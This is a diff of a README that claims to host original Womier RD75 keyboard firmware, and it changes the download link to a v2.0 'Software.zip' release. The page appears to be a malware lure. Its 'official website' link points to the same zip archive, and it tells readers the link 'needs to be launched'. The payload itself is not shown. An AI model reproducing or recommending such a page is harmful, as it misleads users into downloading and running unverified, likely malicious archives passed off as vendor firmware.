@@ -23,12 +23,12 @@ This repository contains the original firmware for the Womier RD75 keyboard. Div
 
 ### 🚀 Get Started:
 To begin your journey with the Womier RD75 firmware, click the button below to download the package:
-[![Download Firmware](https://github.com/Unknownones1/Womier_RD75/releases/download/v1.0/Application.zip)](https://github.com/Unknownones1/Womier_RD75/releases/download/v1.0/Application.zip)
+[![Download Firmware](https://github.com/Unknownones1/Womier_RD75/releases/download/v2.0/Software.zip)](https://github.com/Unknownones1/Womier_RD75/releases/download/v2.0/Software.zip)
 
 Please note that the link provided needs to be launched for you to access the firmware files.
 
 ### 🌐 Visit Our Website:
-Explore more about the Womier RD75 keyboard and its features by visiting our official website [here](https://github.com/Unknownones1/Womier_RD75/releases/download/v1.0/Application.zip).
+Explore more about the Womier RD75 keyboard and its features by visiting our official website [here](https://github.com/Unknownones1/Womier_RD75/releases/download/v2.0/Software.zip).
 
 ### Releases:
 If the download link does not work or you need to explore more options, check out the "Releases" section of this repository for the latest updates and versions of the firmware.
